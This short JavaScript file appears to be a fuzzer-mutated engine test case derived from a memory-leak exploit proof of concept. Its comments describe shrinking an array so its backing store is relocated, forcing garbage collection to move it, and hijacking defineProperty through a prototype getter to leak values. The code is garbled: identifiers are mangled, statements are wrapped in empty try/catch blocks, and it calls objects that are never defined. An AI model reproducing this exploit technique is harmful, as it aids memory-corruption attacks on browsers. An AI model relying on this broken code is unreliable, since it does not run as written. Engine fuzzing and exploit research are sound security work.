var o0 = new write([], {});
var o503 = o621.o625(o31);

var o1 = 1

var o3 = new o2(100);
try {
o374 = 0.1;
}catch(e){}
try {
o3[2] = 0.1;
}catch(e){}

function o4() {
    try {
for (var o30 = {
            o110: type.o89
        }; o5 < 0x100000; ++o5) {
        var o6 = new String();
    }
}catch(e){}
}

function o7() {
    try {
o3.length = 1;
}catch(e){} // shorten the array so the backstore pointer is relocated
    try {
o4();
}catch(e){}         // force gc to move the array's elements backstore
    try {
return o1;
}catch(e){}
}

try {
Object.prototype.__defineGetter__("defineProperty", o7);
}catch(e){}

var o17 = o8.get.toString();

try {
for (var o5 = 0; o5 < 20; o5++) { // however many values you want to leak
    try {
o9.o10(o8[o5]);
}catch(e){}
}
}catch(e){}